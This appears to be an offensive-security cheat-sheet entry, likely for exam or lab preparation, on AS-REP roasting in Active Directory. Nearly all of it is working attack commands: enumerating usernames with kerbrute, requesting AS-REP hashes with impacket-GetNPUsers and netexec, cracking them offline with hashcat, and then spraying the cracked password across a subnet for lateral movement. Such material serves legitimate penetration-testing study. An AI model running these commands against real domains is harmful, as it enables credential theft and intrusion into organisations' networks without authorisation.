title: AS-REP Roasting
body: Crack accounts that have Kerberos pre-authentication DISABLED. The DC hands you an AS-REP encrypted with the user's password hash WITHOUT you proving who you are, so you crack it offline. Works with just a username list (no creds), better with creds. Step-by-step below.
cmd:
# ══════════════════════════════════════════════════════
# AS-REP ROASTING → accounts with Kerberos pre-auth DISABLED
# ══════════════════════════════════════════════════════
# No valid domain creds needed (with a user list); more reliable WITH creds.

# -- STEP 1: Build/validate a user list -----------------------
# No creds? You need candidate usernames (OSINT, emails, web app).
# Validate which actually exist with kerbrute first:
./kerbrute_linux_amd64 userenum -d domain.com --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames.txt
# Save the valid hits to users.txt (one per line).
# WITH creds you can SKIP this - STEP 2 enumerates real users for you.

# -- STEP 2: Request the AS-REP hashes ------------------------
# No creds (spray a user list - only no-preauth users return a hash):
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip $ip -request -format hashcat -outputfile asrep.txt
# WITH creds (auto-finds ALL no-preauth users - more reliable):
impacket-GetNPUsers domain.com/user:'pass' -dc-ip $ip -request -format hashcat -outputfile asrep.txt
# netexec one-shot alternative (with creds):
nxc ldap $ip -u user -p 'pass' --asreproast asrep.txt

# -- STEP 3: VERIFY you actually got a hash -------------------
cat asrep.txt
# SUCCESS looks like:  $krb5asrep$23$user@DOMAIN.COM:<hex>...
# Empty file / no $krb5asrep$ line = no vulnerable users. That's a real
# answer, not an error - not every domain disables preauth.
head -c 12 asrep.txt        # confirm the $krb5asrep$ prefix

# -- STEP 4: Crack offline ------------------------------------
# AS-REP = hashcat mode 18200  (kerberoast is 13100 - DIFFERENT mode!):
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# Add rules for service-account-style passwords:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep.txt --show        # display cracked results

# -- STEP 5: Use the cracked password - DON'T STOP HERE -------
# You now hold a valid domain credential. Immediately:
#   1) SPRAY it everywhere (reuse is the #1 AD win):
nxc smb $subnet -u cracked_user -p 'cracked_pass' --continue-on-success
#   2) Re-run BloodHound marking this user owned - new paths may open.
#   3) Feed it back into the AD escalation vector (kerberoast next, etc.).

# ══════════════════════════════════════════════════════
# GOTCHAS (the stuff that wastes exam time)
# ══════════════════════════════════════════════════════
# Clock skew (KRB_AP_ERR_SKEW) - #1 Kerberos failure on Kali:
sudo ntpdate $ip            # sync time to the DC, then retry STEP 2
sudo rdate -n $ip           # alternative if ntpdate is missing
#
# KDC_ERR_C_PRINCIPAL_UNKNOWN = that username doesn't exist. Your list is
#   guessed/wrong - validate names with kerbrute (STEP 1) first.
#
# Got a hash but it won't crack:
#   - $krb5asrep$23$ = RC4 (crackable). 17/18 = AES (slow).
#   - password just isn't in your list - try a bigger wordlist + rules.
#
# Empty output WITH valid creds = genuinely no preauth-disabled users.
#   Move on to kerberoast / other vectors - don't keep retrying.
warn: AS-REP uses hashcat mode 18200 - NOT 13100 (that's kerberoast); mixing them gives 'no hashes loaded'. Clock skew is the #1 failure: ntpdate to the DC before requesting. An empty result WITH valid creds is a real answer (no vulnerable users), not a bug - don't burn time retrying. After cracking, SPRAY the credential everywhere before anything else.
